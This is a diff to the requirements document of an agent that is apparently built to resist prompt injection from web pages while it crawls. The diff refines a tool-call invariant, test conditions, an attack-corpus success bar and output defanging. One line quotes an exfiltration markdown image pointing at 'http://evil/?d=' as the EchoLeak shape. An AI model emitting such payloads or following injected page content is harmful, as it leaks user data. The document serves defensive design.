@@ -41,11 +41,30 @@ Adapted from `Fable/research/deep-dive/authority-separation/requirements.md` §0
 > placeholders of identical shape. Let `T'` be the set of calls actually issued
 > when real, adversarial page content is present.
 >
-> **The invariant holds iff `T' ⊆ authorized-extensions(T)`.**
+> **The invariant holds iff `T' ⊆ authorized-extensions(T)`**, where
+> `authorized-extensions(T)` is `T` closed under exactly two bounded operations,
+> both authorized by the trusted plan before any data is read:
 >
-> Equivalently: page content may change what a tool call's argument *value* is,
-> but it can never change **which tools are called, how many times, in what
-> order, or cause a call whose shape the trusted plan did not authorize.**
+> **(a) Gating.** Removing a step whose `when` guard the plan declared. A
+> tainted condition may turn a plan-fixed step off, or route among mutually
+> exclusive plan-fixed steps.
+>
+> **(b) Scope-bounded expansion.** Issuing further `fetch` calls whose URLs
+> satisfy the `CrawlScope` predicate the plan fixed, within the plan's own
+> `max_pages` and `max_depth` budget.
+>
+> Nothing else is in the closure.
+
+In prose, and this is the checkable form: page content may choose a call's
+argument **value**, may turn a plan-declared step **off**, and may choose **which
+members** of a plan-fixed URL space are visited and **in what order**. It can
+never introduce a tool the plan did not name, change a call's argument shape, or
+reach a destination outside a literal or a space the plan fixed in advance.
+
+The two exceptions are deliberate and are exactly why §3 claims confidentiality
+of destinations rather than integrity of routing. Stating the invariant without
+them would be an overclaim: `runtime._condition_met` reads a tainted bool, and
+the crawl frontier's request count and order are decided by page links.
 
 ### R6 — no probabilistic crutch
 
@@ -54,7 +73,10 @@ malicious.** Accordingly:
 
 - The security claim is measured **only** under `--approve never --models none`,
   i.e. against a `DeterministicPlanner` and a deliberately hijacked
-  `AdversarialExtractor`, with **no API key and no network beyond loopback**.
+  `AdversarialExtractor`, with **no API key and no sockets at all** — the suite
+  drives a recording in-process HTTP client. A loopback fixture site
+  (`demo/serve.py`) exists for live end-to-end runs, which are exercised
+  separately from the security claim.
 - Human approval is a UX affordance. It is never load-bearing and is never
   available in tests.
 - Classifiers, LLM judges, and instruction-hierarchy prompting are **not used at
@@ -191,7 +213,8 @@ Measured under `--approve never --models none`.
 - **S1 — Security.** 0 leaks across the full attack corpus (≥14 attacks: ≥10
   rephrasings plus the four crawl-native classes in §7). "Leak" = any outbound
   connection to a non-scope host, or any write outside the workspace.
-- **S2 — Corpus has teeth.** The undefended baseline is hijacked ≥6/14. A
+- **S2 — Corpus has teeth.** The undefended baseline is hijacked on ≥6 of the
+  corpus, whatever its size. A
   corpus that cannot hijack an undefended agent proves nothing.
 - **S3 — Utility.** Benign task success across categories i, ii and iii-a is
   ≥80% of the undefended baseline's. Reference bar from the research: CaMeL
@@ -249,8 +272,16 @@ within the documented TOCTOU window (§5).
   assert effects.
 - **Rendering is a channel.** Tainted text carrying `![](http://evil/?d=)` is
   auto-fetched by some terminals and most log viewers (this is the EchoLeak
-  shape). `report` and the trace `reason` field run a deterministic
-  `netpolicy.defang()` over tainted output. Structural, not a classifier.
+  shape). Any argument a tool declares in `ToolSpec.render_params` is run
+  through a deterministic `netpolicy.defang()` by the **runtime** when its value
+  is tainted — `report.summary`, `write_file.content`, and the trace `reason`
+  field. Structural, not a classifier, and enforced in one place rather than
+  asked of each tool.
+- **The guard judges the effective value, not the literal.** A tool declaring
+  `ToolSpec.effective` maps its arguments to what it will actually act on before
+  Layer 2 sees them. Without this, `write_file` was confined on the literal
+  `"out.md"` while writing `<workspace>/out.md` — Layer 2 judging a string
+  nobody used. This is a soundness requirement, not a convenience.
 
 ## 10. Method commitments
 
